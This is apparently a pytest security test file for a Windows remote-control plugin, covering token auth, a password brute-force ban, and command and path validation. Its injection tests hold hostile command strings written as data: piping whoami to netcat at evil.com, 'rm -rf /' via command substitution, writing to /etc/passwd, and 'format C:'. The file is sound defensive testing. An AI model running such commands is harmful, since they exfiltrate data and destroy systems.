"""
tests/test_security.py - V0.7.0
Security-focused tests: token auth, second-factor password, injection attempts.
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import __init__ as plugin


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------
@pytest.fixture()
def cfg() -> dict:
    return plugin.get_config(None)


@pytest.fixture()
def server(cfg: dict) -> plugin.WinRemoteServer:
    """Server with mocked context and audit."""
    ctx = MagicMock()
    audit = MagicMock()
    audit.write = AsyncMock()
    return plugin.WinRemoteServer(ctx, cfg, audit)


# ---------------------------------------------------------------------------
# Token / handshake
# ---------------------------------------------------------------------------
class TestHandshake:
    async def test_missing_token_rejected(self, server: plugin.WinRemoteServer) -> None:
        """When secret_token is empty, server rejects with 'server misconfigured'."""
        ws = MagicMock()
        ws.remote_address = ("10.0.0.1", 5000)
        ws.send = AsyncMock()
        ws.close = AsyncMock()
        # First return a handshake message, then close on second recv
        # This lets _handle_agent read the token and hit the "empty token" branch
        ws.recv = AsyncMock(
            side_effect=[
                plugin.json.dumps({"token": "", "agent_id": "x"}),
                plugin.websockets.exceptions.ConnectionClosed(None, None),
            ]
        )

        with patch("asyncio.sleep", new=AsyncMock()):
            await server._handle_agent(ws)

        # The server should call ws.close() when token is empty/misconfigured
        assert ws.close.called
        # And it should have sent an error message
        sent_calls = [str(c) for c in ws.send.call_args_list]
        assert any("misconfig" in s.lower() for s in sent_calls)

    async def test_bad_token_rejected(self, server: plugin.WinRemoteServer) -> None:
        server.cfg["secret_token"] = "correct-horse"
        ws = MagicMock()
        ws.remote_address = ("10.0.0.2", 5001)
        ws.send = AsyncMock()
        ws.close = AsyncMock()
        ws.recv = AsyncMock(return_value=plugin.json.dumps({"token": "wrong", "agent_id": "x"}))

        with patch("asyncio.sleep", new=AsyncMock()):
            await server._handle_agent(ws)

        # send should have been called with an error
        sent = ws.send.call_args[0][0]
        msg = plugin.json.loads(sent)
        assert msg["type"] == "error"
        assert "invalid" in msg["msg"].lower()


# ---------------------------------------------------------------------------
# PasswordGuard
# ---------------------------------------------------------------------------
class TestPasswordGuard:
    async def test_ban_after_max_attempts(self) -> None:
        g = plugin.PasswordGuard(max_attempts=3, ban_duration=10)
        for _ in range(3):
            ok = await g.check("1.1.1.1", "wrong", "right")
            assert ok is False
        banned = await g.is_banned("1.1.1.1")
        assert banned is True

    async def test_correct_password_resets(self) -> None:
        g = plugin.PasswordGuard(max_attempts=3, ban_duration=10)
        await g.check("2.2.2.2", "wrong", "right")
        ok = await g.check("2.2.2.2", "right", "right")
        assert ok is True
        assert "2.2.2.2" not in g._attempts

    async def test_banned_peer_rejected(self) -> None:
        g = plugin.PasswordGuard(max_attempts=2, ban_duration=60)
        for _ in range(2):
            await g.check("3.3.3.3", "bad", "good")
        # Even with correct password, banned peer is rejected
        ok = await g.check("3.3.3.3", "good", "good")
        assert ok is False


# ---------------------------------------------------------------------------
# Injection patterns
# ---------------------------------------------------------------------------
class TestInjectionPatterns:
    def test_pipe_to_netcat(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell whoami | nc evil.com 4444", cfg)
        assert ok is False
        assert "injection" in reason

    def test_command_substitution(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell echo $(rm -rf /)", cfg)
        assert ok is False

    def test_backtick_substitution(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell `id`", cfg)
        assert ok is False

    def test_write_to_etc(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell echo x > /etc/passwd", cfg)
        assert ok is False

    def test_format_c_drive(self, cfg: dict) -> None:
        ok, reason = plugin.validate_command("shell format C:", cfg)
        assert ok is False
        assert "blacklist" in reason or "dangerous" in reason


# ---------------------------------------------------------------------------
# Path validation edge cases
# ---------------------------------------------------------------------------
class TestPathValidation:
    def test_traversal_attempt(self, cfg: dict) -> None:
        cfg["path_whitelist"] = ["C:\\Allowed"]
        ok, reason = plugin.validate_path("C:\\Allowed\\..\\secret.txt", cfg)
        assert ok is False

    def test_empty_path(self, cfg: dict) -> None:
        ok, reason = plugin.validate_path("", cfg)
        assert ok is False

    def test_whitelist_no_match(self, cfg: dict) -> None:
        cfg["path_whitelist"] = ["D:\\OnlyThis"]
        ok, _ = plugin.validate_path("C:\\Elsewhere\\file.txt", cfg)
        assert ok is False

    def test_dollar_sign_rejected(self, cfg: dict) -> None:
        cfg["path_whitelist"] = ["C:\\"]
        cfg["path_blacklist_keywords"] = ["$", ".."]
        ok, reason = plugin.validate_path("C:\\$env:USERNAME", cfg)
        assert ok is False


# ---------------------------------------------------------------------------
# AgentManager
# ---------------------------------------------------------------------------
class TestAgentManager:
    async def test_max_agents_enforced(self) -> None:
        mgr = plugin.AgentManager(max_agents=2)
        a1 = plugin.AgentConnection(ws=MagicMock(), agent_id="a1")
        a2 = plugin.AgentConnection(ws=MagicMock(), agent_id="a2")
        a3 = plugin.AgentConnection(ws=MagicMock(), agent_id="a3")
        assert await mgr.add(a1) is True
        assert await mgr.add(a2) is True
        assert await mgr.add(a3) is False  # rejected
        assert len(await mgr.list()) == 2

    async def test_prune_dead(self) -> None:
        mgr = plugin.AgentManager(max_agents=4)
        alive = plugin.AgentConnection(ws=MagicMock(), agent_id="live")
        dead = plugin.AgentConnection(ws=MagicMock(), agent_id="dead")
        dead.last_heartbeat -= 100  # old
        await mgr.add(alive)
        await mgr.add(dead)
        dead_ids = await mgr.prune(timeout=15)
        assert "dead" in dead_ids
        assert "live" not in dead_ids


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
